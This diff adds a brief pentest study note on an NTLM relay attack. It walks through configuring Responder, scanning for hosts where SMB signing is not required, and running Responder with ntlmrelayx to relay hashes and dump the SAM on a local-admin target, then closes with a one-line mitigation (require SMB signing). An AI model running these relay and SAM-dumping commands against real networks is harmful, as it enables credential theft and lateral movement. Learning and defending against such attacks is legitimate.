@@ -1,0 +1,15 @@
+First go to the /opt/responder/Responder.conf and turn off SMB and HTTP to pass the NTLM hash.
+(important) It should be noted that Responder cannot use the NTLM hash to the box it grabbed from.
+(important) We need to make sure the account we are running this against is a local admin, since it needs to have access to SAM in order to be able to dump the SAM successfully.
+nmap --script=smb2-security-mode -p445 192.168.1.20
+* "Message signing enabled but not required" is what you are looking for.
+
+(terminal-1)
+python3 responder.py -I tun0 -rdw -v
+
+(terminal-2)
+python3 ntlmrelayx.py -tf /dev/shm/targets.txt -smb2support
+Prevention
+How to defend against this is to go to domain policy and make the message signing "required".
+Reference
+https://youtu.be/C6Q5LVJ3KaQ?si=u3Gy6y3TiynStiPm
